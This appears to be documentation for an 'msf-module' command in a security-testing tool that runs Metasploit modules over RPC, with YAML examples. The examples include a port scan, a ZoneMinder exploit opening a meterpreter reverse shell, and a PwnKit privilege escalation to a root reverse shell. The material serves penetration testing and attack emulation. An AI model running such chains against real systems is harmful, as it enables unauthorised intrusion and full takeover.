.. _msf-module:

==========
msf-module
==========

This command executes Metasploit-Modules via Metasploits RPC-Api.

.. note::

   To configure the connection to the msfrpc-server see :ref:`msf_config`

Some Metasploit-Modules return output. Like the Auxilary-Modules:

.. code-block:: yaml

   commands:
     - type: msf-module
       cmd: auxiliary/scanner/portscan/tcp
       options:
         RHOSTS: 192.42.0.254

Most Exploit-Modules don't create output but instead they create
sessions(see :ref:`msf-session`)

.. code-block:: yaml

   commands:
     - type: msf-module
        cmd: exploit/unix/webapp/zoneminder_snapshots
        creates_session: "foothold"
        options:
          RHOSTS: 192.42.0.254
        payload_options:
          LHOST: 192.42.2.253
        payload: cmd/unix/python/meterpreter/reverse_tcp

.. confval:: cmd

   This option stores the path to the metasploit-module.

   :type: str

   .. note::

     Please note that the path includes the module-type.


.. confval:: target

   This option sets the payload target for the metasploit-module.

   :type: int
   :default: ``0``

.. confval:: creates_session

   A session name that identifies the session that is created by
   the module. This session-name can be used by :ref:`msf-session`

   :type: str

.. confval:: session

   This option is set in exploit['SESSION']. Some modules(post-modules)
   need a session to be executed with.

   :type: str

.. confval:: payload

   Path to a payload for this module.

   :type: str

   The following example illustrates the use of sessions and payloads:

   .. code-block:: yaml

      commands:
        - type: msf-module
           cmd: exploit/unix/webapp/zoneminder_snapshots
           creates_session: "foothold"
           options:
             RHOSTS: 192.42.0.254
           payload_options:
             LHOST: 192.42.2.253
           payload: cmd/unix/python/meterpreter/reverse_tcp

         - type: msf-module
           cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
           session: "foothold"
           creates_session: "root"
           options:
             WRITABLE_DIR: "/tmp"
           payload_options:
             LHOST: 192.42.2.253
             LPORT: 4455
           payload: linux/x64/shell/reverse_tcp

.. confval:: options

   Dict(key/values) of module options, like RHOSTS:

   :type: Dict[str,str]

.. confval:: payload_options

   Dict(key/values) of payload options, like LHOST and LPORT:

   :type: Dict[str,str]
